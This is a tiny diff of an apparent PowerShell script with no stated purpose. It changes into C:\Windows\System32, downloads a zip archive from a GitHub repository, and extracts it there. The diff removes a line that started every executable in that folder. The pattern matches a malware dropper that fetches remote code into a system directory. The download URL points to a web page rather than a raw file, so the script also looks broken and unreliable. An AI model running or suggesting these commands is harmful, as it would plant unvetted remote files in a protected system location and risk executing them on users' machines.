@@ -1,4 +1,3 @@
 cd C:\Windows\System32
 Invoke-WebRequest -Uri "https://github.com/idontknow-CC/wwaaa/blob/main/tailieu.zip"
 Expand-Archive tailieu.zip
-Start-Process -FilePath "C:\Windows\System32\*.exe"
